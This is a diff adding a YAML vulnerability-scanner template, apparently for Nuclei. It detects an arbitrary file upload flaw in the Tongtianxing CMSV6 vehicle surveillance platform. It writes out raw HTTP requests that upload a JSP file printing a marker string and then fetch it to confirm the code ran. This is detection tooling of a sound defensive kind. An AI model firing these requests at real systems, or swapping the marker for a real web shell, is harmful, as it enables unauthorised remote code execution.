@@ -1,0 +1,50 @@
+id: tongtianxing-inspectfile-fileupload
+
+info:
+  name: tongtianxing-inspectfile-fileupload
+  author: fitz
+  severity: critical
+  description: 通天星CMSV6车载视频监控平台inspect_file存在任意文件上传漏洞
+
+  tags: File Upload
+
+variables:
+  filename: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+    - |
+      POST /inspect_file/upload HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+      Content-Length: 209
+      Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      Connection: close
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+      Accept-Encoding: gzip, deflate
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="uploadFile"; filename="{{filename}}.jsp"
+      Content-Type: application/ocet-stream
+
+      <% out.println("435352Els1K9wZvOlSsdsdmrg"); %>
+      --00content0boundary00--
+
+    - |
+      GET /upload/software/{{uploadfilename}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
+      Accept: */*
+    
+    extractors:
+      - type: regex
+        name: uploadfilename
+        group: 0
+        regex: 
+         - '\d+_\w+\.jsp'
+        internal: true
+
+    matchers:
+       - type: dsl
+         dsl:
+           - status_code==200 && contains_all(body_2,"435352Els1K9wZvOlSsdsdmrg")
